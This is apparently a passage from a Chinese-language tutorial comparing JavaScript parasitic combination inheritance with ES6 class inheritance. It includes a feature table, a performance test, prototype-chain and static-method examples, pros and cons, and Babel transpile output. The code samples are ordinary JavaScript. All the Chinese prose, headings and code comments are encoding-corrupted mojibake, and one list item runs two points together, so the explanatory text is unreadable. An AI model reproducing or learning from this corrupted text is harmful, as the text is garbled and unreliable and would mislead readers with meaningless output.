<table><thead><tr><th>ç‰¹æ€§</th><th>å¯„ç”Ÿç»„åˆç»§æ‰¿</th><th>ES6 ç±»ç»§æ‰¿</th></tr></thead><tbody><tr><td><strong>è¯­æ³•</strong>â€‹</td><td>å‡½æ•° + åŸå‹</td><td>ç±»è¯­æ³•ç³–</td></tr><tr><td><strong>å¯è¯»æ€§</strong>â€‹</td><td>è¾ƒä½</td><td>é«˜</td></tr><tr><td><strong>ç»§æ‰¿åŸç†</strong>â€‹</td><td>åŸå‹é“¾ + æ„é€ å‡½æ•°</td><td>åŸºäºåŸå‹é“¾</td></tr><tr><td><strong>é™æ€æ–¹æ³•</strong>â€‹</td><td>éœ€æ‰‹åŠ¨å¤„ç†</td><td>åŸç”Ÿæ”¯æŒ</td></tr><tr><td><strong>ç§æœ‰å­—æ®µ</strong>â€‹</td><td>æ— ç›´æ¥æ”¯æŒ</td><td>ES2022+ æ”¯æŒ</td></tr><tr><td><strong>super è°ƒç”¨</strong>â€‹</td><td>éœ€æ‰‹åŠ¨å®ç°</td><td>åŸç”Ÿæ”¯æŒ</td></tr><tr><td><strong>new.target</strong>â€‹</td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td><strong>constructor</strong>â€‹</td><td>éœ€æ‰‹åŠ¨è®¾ç½®</td><td>è‡ªåŠ¨è®¾ç½®</td></tr></tbody></table>
<h2 data-id="heading-5">4. æ€§èƒ½å¯¹æ¯”</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ€§èƒ½æµ‹è¯•</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceTest</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">testParasitic</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> start = performance.<span class="hljs-title function_">now</span>();
    
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">name</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    }
    <span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>; };
    
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name</span>) {
      <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
    }
    <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
    <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Child</span>;
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {
      <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'test'</span> + i);
    }
    
    <span class="hljs-keyword">return</span> performance.<span class="hljs-title function_">now</span>() - start;
  }
  
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">testES6</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> start = performance.<span class="hljs-title function_">now</span>();
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
      <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; }
      <span class="hljs-title function_">getName</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>; }
    }
    
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
      <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) { <span class="hljs-variable language_">super</span>(name); }
    }
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {
      <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'test'</span> + i);
    }
    
    <span class="hljs-keyword">return</span> performance.<span class="hljs-title function_">now</span>() - start;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¯„ç”Ÿç»„åˆç»§æ‰¿è€—æ—¶:'</span>, <span class="hljs-title class_">PerformanceTest</span>.<span class="hljs-title function_">testParasitic</span>().<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>), <span class="hljs-string">'ms'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ES6 ç±»ç»§æ‰¿è€—æ—¶:'</span>, <span class="hljs-title class_">PerformanceTest</span>.<span class="hljs-title function_">testES6</span>().<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>), <span class="hljs-string">'ms'</span>);

<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// å¯„ç”Ÿç»„åˆç»§æ‰¿è€—æ—¶: 26.49 ms</span>
<span class="hljs-comment">// ES6 ç±»ç»§æ‰¿è€—æ—¶: 13.97 ms</span>
</code></pre>
<p><strong>æ€§èƒ½ç»“æœ</strong>ï¼š</p>
<ul>
<li>ES6 ç±»ç»§æ‰¿é€šå¸¸<strong>æ›´å¿«</strong>ï¼ˆV8 ä¼˜åŒ–ï¼‰</li>
<li>å¯„ç”Ÿç»„åˆç»§æ‰¿<strong>ç¨æ…¢</strong>ä½†å·®å¼‚å¾ˆå°</li>
<li>å®é™…åº”ç”¨å·®å¼‚å¯å¿½ç•¥ä¸è®¡</li>
</ul>
<h2 data-id="heading-6">5. ç‰¹æ€§è¯¦è§£</h2>
<h3 data-id="heading-7">5.1 åŸå‹é“¾</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¯„ç”Ÿç»„åˆç»§æ‰¿</span>
<span class="hljs-keyword">const</span> child1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'Alice'</span>, <span class="hljs-number">10</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child1.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child1 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Child</span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child1 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Parent</span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child1 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// ES6 ç±»ç»§æ‰¿</span>
<span class="hljs-keyword">const</span> child2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">'Bob'</span>, <span class="hljs-number">12</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(child2) === <span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(child2)) === <span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child2 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Child</span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child2 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Parent</span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-8">5.2 é™æ€æˆå‘˜ç»§æ‰¿</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¯„ç”Ÿç»„åˆç»§æ‰¿ï¼ˆéœ€æ‰‹åŠ¨å®ç°ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Animal</span>.<span class="hljs-property">staticMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-string">'Animal static'</span>; };

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Dog</span>.<span class="hljs-property">__proto__</span> = <span class="hljs-title class_">Animal</span>;  <span class="hljs-comment">// ç»§æ‰¿é™æ€æ–¹æ³•</span>
<span class="hljs-title class_">Dog</span>.<span class="hljs-title function_">staticMethod</span>();  <span class="hljs-comment">// 'Animal static'</span>

<span class="hljs-comment">// æˆ–</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(<span class="hljs-title class_">Dog</span>, <span class="hljs-title class_">Animal</span>);

<span class="hljs-comment">// ES6 ç±»ç»§æ‰¿ï¼ˆè‡ªåŠ¨ç»§æ‰¿ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-string">'Animal static'</span>; }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">dogStatic</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-string">'Dog static'</span>; }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Dog</span>.<span class="hljs-title function_">staticMethod</span>());  <span class="hljs-comment">// 'Animal static'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Dog</span>.<span class="hljs-title function_">dogStatic</span>());    <span class="hljs-comment">// 'Dog static'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-title class_">Dog</span>) === <span class="hljs-title class_">Animal</span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-9">5.3 æ–¹æ³•é‡å†™</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¯„ç”Ÿç»„åˆç»§æ‰¿</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-string">'Animal sound'</span>; };

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"/>) {}
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>;

<span class="hljs-comment">// é‡å†™æ–¹æ³•</span>
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span>
  <span class="hljs-keyword">const</span> parentSpeak = <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">return</span> parentSpeak + <span class="hljs-string">' and Woof!'</span>;
};

<span class="hljs-comment">// ES6 ç±»ç»§æ‰¿</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-string">'Animal sound'</span>; }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">speak</span>() + <span class="hljs-string">' and Woof!'</span>;
  }
}
</code></pre>
<h2 data-id="heading-10">6. ä¼˜ç¼ºç‚¹å¯¹æ¯”</h2>
<h3 data-id="heading-11">å¯„ç”Ÿç»„åˆç»§æ‰¿çš„ä¼˜ç‚¹</h3>
<ol>
<li><strong>å…¼å®¹æ€§æå¥½</strong>ï¼šæ”¯æŒæ‰€æœ‰æµè§ˆå™¨</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// IE6+ éƒ½æ”¯æŒ</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property">create</span> !== <span class="hljs-string">'function'</span>) {
  <span class="hljs-title class_">Object</span>.<span class="hljs-property">create</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">o</span>) {
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params"/>) {}
    F.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = o;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>();
  };
}
</code></pre>
<ol>
<li><strong>æ›´çµæ´»</strong>ï¼šæ‰‹åŠ¨æ§åˆ¶ç»§æ‰¿é€»è¾‘</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¯ä»¥é€‰æ‹©æ€§ç»§æ‰¿</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createMixin</span>(<span class="hljs-params">baseClass, mixin</span>) {
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">MixedClass</span>(<span class="hljs-params"/>) {
    baseClass.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);
    mixin.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);
  }
  <span class="hljs-title class_">MixedClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(baseClass.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">MixedClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, mixin.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">MixedClass</span>;
}
</code></pre>
<ol>
<li><strong>å†…å­˜æ•ˆç‡</strong>ï¼šå¯ä¼˜åŒ–åŸå‹é“¾æ·±åº¦</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ‰å¹³åŒ–åŸå‹é“¾</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createFlatInheritance</span>(<span class="hljs-params">parent, child</span>) {
  <span class="hljs-comment">// åˆå¹¶åŸå‹æ–¹æ³•ï¼Œå‡å°‘æŸ¥æ‰¾æ·±åº¦</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> parent.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) {
    <span class="hljs-keyword">if</span> (parent.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
      child.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[key] = parent.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[key];
    }
  }
}
</code></pre>
<h3 data-id="heading-12">å¯„ç”Ÿç»„åˆç»§æ‰¿çš„ç¼ºç‚¹</h3>
<ol>
<li><strong>è¯­æ³•ç¹ç</strong>ï¼Œæ˜“å‡ºé”™</li>
<li><strong>ç§æœ‰å­—æ®µä¸æ”¯æŒ</strong>ï¼Œéœ€ç”¨é—­åŒ…æ¨¡æ‹Ÿ</li>
<li><strong>é™æ€æ–¹æ³•</strong>éœ€æ‰‹åŠ¨å¤„ç†</li>
<li><strong>å¯è¯»æ€§å·®</strong></li>
</ol>
<h3 data-id="heading-13">ES6 ç±»ç»§æ‰¿çš„ä¼˜ç‚¹</h3>
<ol>
<li><strong>è¯­æ³•ç®€æ´</strong>ï¼Œæ˜“äºç†è§£</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">height, width</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span> = height;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span> = width;
  }
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">area</span>() { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span> * <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span>; }
}
</code></pre>
<ol start="2">
<li><strong>å†…ç½® super</strong>ï¼Œæ–¹ä¾¿è°ƒç”¨çˆ¶ç±»</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Rectangle</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">side</span>) {
    <span class="hljs-variable language_">super</span>(side, side);
  }
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">area</span>() {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Calculating square area...'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-property">area</span>;
  }
}
</code></pre>
<ol start="3">
<li><strong>æ”¯æŒé™æ€æ–¹æ³•å’Œå­—æ®µ</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
  <span class="hljs-keyword">static</span> staticField = <span class="hljs-string">'static'</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-string">'static method'</span>; }
  #privateField = <span class="hljs-string">'private'</span>;
}
</code></pre>
<ol start="4">
<li><strong>æ›´å¥½çš„å·¥å…·æ”¯æŒ</strong>ï¼ˆTypeScriptã€IDEï¼‰</li>
</ol>
<h3 data-id="heading-14">ES6 ç±»ç»§æ‰¿çš„ç¼ºç‚¹</h3>
<ol>
<li><strong>è¯­æ³•ç³–</strong>ï¼Œå®é™…è¿˜æ˜¯åŸå‹ç»§æ‰¿</li>
<li><strong>å¿…é¡»ç”¨ new è°ƒç”¨</strong>ï¼Œä¸èƒ½å½“æ™®é€šå‡½æ•°31.  <strong>æ²¡æœ‰ç§æœ‰æ–¹æ³•</strong>ï¼ˆES2022+ æ‰æœ‰ï¼‰</li>
<li><strong>å…¼å®¹æ€§</strong>ï¼šæ—§æµè§ˆå™¨éœ€è½¬è¯‘</li>
<li><strong>æŸäº›ç‰¹æ€§é™åˆ¶</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method</span> = <span class="hljs-function">() =&gt;</span> { <span class="hljs-comment">/* ç®­å¤´å‡½æ•°ï¼Œthis ç»‘å®š */</span> };
  }
  <span class="hljs-comment">// ä¸èƒ½è¿™æ ·å†™ï¼š</span>
  <span class="hljs-comment">// property = () =&gt; { };  // ES7+ æ‰æ”¯æŒ</span>
}
</code></pre>
<h2 data-id="heading-15">7. è½¬è¯‘ç»“æœå¯¹æ¯”</h2>
<h3 data-id="heading-16">Babel è½¬è¯‘ ES6 ç±»ç»§æ‰¿</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ES6</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; }
  <span class="hljs-title function_">say</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">super</span>(name);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
}

<span class="hljs-comment">// Babel è½¬è¯‘å</span>
<span class="hljs-meta">"use strict"</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">_inherits</span>(<span class="hljs-params">subClass, superClass</span>) {
  subClass.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(superClass &amp;&amp; superClass.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, {
    <span class="hljs-attr">constructor</span>: { <span class="hljs-attr">value</span>: subClass, <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span> }
  });
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(subClass, superClass);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">_createSuper</span>(<span class="hljs-params">Derived</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">_createSuperInternal</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Super</span> = <span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-title class_">Derived</span>);
    <span class="hljs-keyword">var</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">construct</span>(<span class="hljs-title class_">Super</span>, <span class="hljs-variable language_">arguments</span>, <span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">constructor</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">_possibleConstructorReturn</span>(<span class="hljs-variable language_">this</span>, result);
  };
}

<span class="hljs-keyword">var</span> <span class="hljs-title class_">Parent</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
};

<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">say</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">say</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
};

<span class="hljs-keyword">var</span> <span class="hljs-title class_">Child</span> = <span class="hljs-comment">/*#__PURE__*/</span><span class="hljs-keyword">function</span> (<span class="hljs-params">_Parent</span>) {
  <span class="hljs-title function_">_inherits</span>(<span class="hljs-title class_">Child</span>, _Parent);
  <span class="hljs-keyword">var</span> _super = <span class="hljs-title function_">_createSuper</span>(<span class="hljs-title class_">Child</span>);
  
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-keyword">var</span> _this;
    _this = _super.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
    _this.<span class="hljs-property">age</span> = age;
    <span class="hljs-keyword">return</span> _this;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Child</span>;
}(<span class="hljs-title class_">Parent</span>);
</code></pre>
<h2 data-id="heading-17">8. å®é™…åº”ç”¨å»ºè®®</h2>
<h3 data-id="heading-18">é€‚åˆä½¿ç”¨å¯„ç”Ÿç»„åˆç»§æ‰¿çš„åœºæ™¯</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. éœ€è¦æ”¯æŒ IE çš„é¡¹ç›®</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span> &amp;&amp; 
    <span class="hljs-regexp">/MSIE|Trident/</span>.<span class="hljs-title function_">test</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">navigator</span>.<span class="hljs-property">userAgent</span>)) {
  <span class="hljs-comment">// ä½¿ç”¨å¯„ç”Ÿç»„åˆç»§æ‰¿</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">IECompatibleClass</span>(<span class="hljs-params"/>) {}
}

<span class="hljs-comment">// 2. éœ€è¦æ·±åº¦å®šåˆ¶ç»§æ‰¿é€»è¾‘</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createCustomInheritance</span>(<span class="hljs-params">SuperClass, mixins</span>) {
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">CustomClass</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">SuperClass</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>);
    mixins.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">mixin</span> =&gt;</span> {
      mixin.<span class="hljs-property">init</span> &amp;&amp; mixin.<span class="hljs-property">init</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>);
    });
  }
  
  <span class="hljs-title class_">CustomClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">SuperClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
  mixins.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">mixin</span> =&gt;</span> {
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">CustomClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, mixin.<span class="hljs-property">methods</span>);
  });
  
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">CustomClass</span>;
}
</code></pre>
<h3 data-id="heading-19">é€‚åˆä½¿ç”¨ ES6 ç±»ç»§æ‰¿çš„åœºæ™¯</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. ç°ä»£å‰ç«¯æ¡†æ¶</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) {
    <span class="hljs-variable language_">super</span>(props);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = { <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> };
  }
  
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{this.state.count}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  }
}

<span class="hljs-comment">// 2. Node.js æœåŠ¡ç«¯</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = config;
  }
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params"/>) { <span class="hljs-comment">/* ... */</span> }
}

